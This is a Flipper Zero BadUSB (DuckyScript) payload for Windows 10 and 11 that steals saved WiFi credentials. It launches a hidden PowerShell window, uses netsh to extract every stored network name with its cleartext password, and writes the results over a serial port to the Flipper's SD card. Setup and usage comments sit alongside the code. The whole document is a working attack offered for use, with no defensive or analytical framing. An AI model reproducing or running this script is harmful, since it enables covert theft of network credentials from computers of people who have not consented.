REM Title: Windows WiFiGrabber to Flipper Storage
REM Author: gotshell
REM Credits: emptythevoid
REM Original Repo: https://github.com/emptythevoid/flipperzero
REM Target: Windows 10, Windows 11
REM Version: 1.0

REM The Device IDs (defaults are HID\\VID_046D\&PID_C529  USB\\VID_0483\&PID_5740)
REM Check IDs with: Get-WmiObject Win32_PnPEntity | Where-Object { $_.DeviceID -like "USB*" } | Select-Object DeviceID, Name 
REM Should check both with BadUSB mode enabled and disabled
REM The Baud rate (default is 230400)

REM Setup: change $SPATH as you prefer, remember that /ext is / of ssd card 
REM Usage: plug the flipper in, run the script, wait for capslock to stop blinking, hit BACK to the Flipper Application list, wait a few seconds (depends on how large is the file to exfil), disconnect the flipper.

REM Open Powershell
DELAY 500
GUI r
DELAY 500
REM Run Powershell by full path to avoid Windows Terminal. Launch hidden.
STRING %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -w h
DELAY 500
ENTER
DELAY 750

REM ## Command to execute/data to exfiltrate. Don't forget cast to string. 
ALTSTRING $d=((netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass}} | Format-Table -AutoSize | Out-String);
REM Output: list of WiFi networks ssid the device has been connected to along with their passwords

REM Once payload is deployed and the Flipper is backed out to normal mode, the script will determine which COM port the Flipper is plugged in to by searching for the USB ID. 
REM It will then write the output (string) of the executed command to the specified path and file on the Flipper's SD card.

REM ## The VendorID and ProductID to Match. If you'd change the BadUSB IDs in the BadKB app or in this script, you need to change these values to match. 
REM Otherwise Powershell won't detect the Flipper when it returns to normal mode.
ALTSTRING $BHID="HID\\VID_046D\&PID_C529";
ALTSTRING $SUSB="USB\\VID_0483\&PID_5740";

REM ## The path on the Flipper's SD card to store the exfliltrated data
ALTSTRING $SPATH="/ext/badusb/working/wifi_to_sd/exfil_data.txt"
ENTER

REM ## Perform 600 loops, to check if BadUSB is still active, wait 1 sec. If the Flipper is just disconnected, the loop will wait 4 sec.

ALTSTRING 1..600|%{Try{$p=New-Object System.IO.Ports.SerialPort("COM$(((Get-PNPDevice -PresentOnly|Where{$_.InstanceID -match $SUSB -and $_.Class -eq "Ports"}) -split "COM")[1][0])",230400,'None',8,'one');$p.open();$p.Write("storage write $SPATH `r`n");$p.Write($d);$p.Write("$([char] 3)");$p.Close();exit}Catch{Sleep 1}}

ENTER

REM Flash Capslock to indicate when to back out of BadUSB mode
CAPSLOCK
DELAY 100
CAPSLOCK
DELAY 100
CAPSLOCK
DELAY 100
CAPSLOCK
DELAY 100
CAPSLOCK
DELAY 100
CAPSLOCK
DELAY 100
CAPSLOCK
DELAY 100
CAPSLOCK
DELAY 100
CAPSLOCK
DELAY 100
CAPSLOCK
DELAY 100
CAPSLOCK
DELAY 100
CAPSLOCK
DELAY 100
CAPSLOCK
DELAY 100
CAPSLOCK
DELAY 100
CAPSLOCK
DELAY 100
CAPSLOCK

